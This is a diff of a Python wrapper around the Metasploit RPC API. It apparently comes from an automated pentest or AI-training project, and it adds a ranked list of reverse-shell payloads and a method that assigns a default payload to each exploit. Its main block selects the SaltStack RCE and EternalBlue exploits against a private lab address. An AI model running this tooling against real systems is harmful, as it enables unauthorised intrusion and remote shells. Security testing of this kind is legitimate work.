@@ -1,9 +1,16 @@
 import configparser
 import time
-
+import signal
+import socket
 from pymetasploit3.msfrpc import MsfRpcClient, MsfConsole
 
 from extra_scripts import *
+
+'''
+pymetasploit3.msfrpc has been customised due to the fact that there wa no timeout in the "post_request" definition (which is a little bit silly)
+It is now set at 5.0 seconds.
+
+'''
 
 
 class Msfrpc:
@@ -21,16 +28,32 @@ class Msfrpc:
         except FileExistsError as err:
             print(self.color_monitor.background_FAIL + '[x] File exists error: {}'.format(err),
                   self.color_monitor.background_ENDC)
+            quit()
 
         # infos related to metasploit
         self.local_port = str(config['Metasploit']['lport'])
         self.proxy_host = str(config['Metasploit']['proxy_host'])
         self.user = str(config['Metasploit']['user'])
         self.password = str(config['Metasploit']['password'])
+        self.default_list_payload_sorted = ['windows/meterpreter/reverse_tcp',
+                                            'java/meterpreter/reverse_tcp',
+                                            'php/meterpreter/reverse_tcp',
+                                            'php/meterpreter_reverse_tcp',
+                                            'ruby/shell_reverse_tcp',
+                                            'cmd/unix/interact',
+                                            'cmd/unix/reverse',
+                                            'cmd/unix/reverse_perl',
+                                            'cmd/unix/reverse_netcat_gaping',
+                                            'windows/meterpreter/reverse_nonx_tcp',
+                                            'windows/meterpreter/reverse_ord_tcp',
+                                            'windows/shell/reverse_tcp',
+                                            'generic/shell_reverse_tcp']  # documentation : https://docs.rapid7.com/metasploit/working-with-payloads/
 
         # infos related to common parameters
         self.service_rpc_password = str(config['Common']['msgrpc_pass'])
         self.service_rpc_port = str(config['Common']['server_port'])
+        self.save_path_ia_data = str(config['Common']['save_path'])
+        self.save_ia_data_file = str(config['Common']['save_file'])
 
         # stored parameters
         self.client = None
@@ -38,6 +61,7 @@ class Msfrpc:
         self.list_of_exploit = None
         self.list_of_auxiliaries = None
         self.list_of_payloads = None
+        self.default_list_payload_per_exploit = None
         # current chosen values
         self.current_exploit = None
         self.current_auxiliary = None
@@ -68,7 +92,7 @@ class Msfrpc:
         :return:
         '''
         try:
-            client = MsfRpcClient(self.service_rpc_password, port=int(self.service_rpc_port))
+            client = MsfRpcClient(self.service_rpc_password, port=int(self.service_rpc_port), )
             console = MsfConsole(client)
             print(self.color_monitor.background_OKGREEN + "[*] Success in login" +
                   self.color_monitor.background_ENDC)
@@ -107,6 +131,39 @@ class Msfrpc:
         print(
             self.color_monitor.background_OKGREEN + "[*] Get succesfully the list of payloads" + self.color_monitor.background_ENDC)
 
+    def get_default_payload(self):
+        '''
+        Method used to get the default payload
+        :return: dictionary of default payload for each exploit
+        '''
+        default_payload_dictionary = {}
+        loading_iteration = 0
+
+        try:
+
+            for exploit in self.list_of_exploit:
+                self.run_an_exploit(exploit)
+                list_of_payloads = self.current_exploit.targetpayloads()
+                for payload in self.default_list_payload_sorted:
+                    if payload in list_of_payloads:
+                        loading_iteration += 1
+                        print(
+                            self.color_monitor.background_OKGREEN + "[*] {}/{} Retrieving default payload for exploit {} : {}".format(
+                                str(loading_iteration),
+                                str(len(self.list_of_exploit) + 1),
+                                str(exploit), str(payload)) +
+                            self.color_monitor.background_ENDC)
+                        default_payload_dictionary[str(exploit)] = str(payload)
+                        break
+
+            self.default_list_payload_per_exploit = default_payload_dictionary
+
+        except Exception as e:
+            print(
+                self.color_monitor.background_FAIL + "[x] Failed to get default payload : {}".format(
+                    str(e)),
+                self.color_monitor.background_ENDC)
+
     def run_an_exploit(self, chosen_exploit):
         '''
         Method used to run an exploit
@@ -119,7 +176,8 @@ class Msfrpc:
                 str(chosen_exploit)),
                   self.color_monitor.background_ENDC)
         except Exception as e:
-            print(self.color_monitor.background_FAIL + "[x] Failed to run exploit : {}".format(str(e)),
+            print(self.color_monitor.background_FAIL + "[x] Failed to run exploit {} : {}".format(str(chosen_exploit),
+                                                                                                  str(e)),
                   self.color_monitor.background_ENDC)
 
     def run_an_auxiliary(self, chosen_auxiliary):
@@ -438,6 +496,7 @@ if __name__ == '__main__':
     env.launch_metasploit()
     env.connection_rpc()
     env.get_exploits()
+    env.run_an_exploit('exploit/linux/misc/saltstack_salt_unauth_rce')
     env.run_an_exploit('windows/smb/ms17_010_eternalblue')
     options = env.change_option_exploit('CheckModule', 'auxiliary/scanner/smb/smb_ms17_010', 'STR')
     options = env.change_option_exploit('RHOSTS', '172.16.1.2', 'STR')
